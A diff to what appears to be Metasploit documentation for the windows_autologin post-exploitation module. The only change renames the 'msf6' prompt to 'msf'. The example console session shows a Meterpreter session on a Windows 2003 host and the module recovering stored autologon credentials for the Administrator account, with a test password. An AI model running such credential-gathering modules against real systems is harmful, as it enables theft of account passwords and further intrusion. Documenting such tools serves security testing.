@@ -58,7 +58,7 @@ msf post(windows_autologin) > run
 ### Windows 2003
 
 ```
-msf6 post(windows/gather/credentials/windows_autologin) > sessions -i 3
+msf post(windows/gather/credentials/windows_autologin) > sessions -i 3
 [*] Starting interaction with 3...
 
 meterpreter > sysinfo
@@ -71,7 +71,7 @@ Logged On Users : 2
 Meterpreter     : x86/windows
 meterpreter > background
 [*] Backgrounding session 3...
-msf6 post(windows/gather/credentials/windows_autologin) > run
+msf post(windows/gather/credentials/windows_autologin) > run
 
 [*] Running against WIN2003 on session 3
 [+] AutoAdminLogon=, DefaultDomain=WIN2003, DefaultUser=Administrator, DefaultPassword=TestPassword
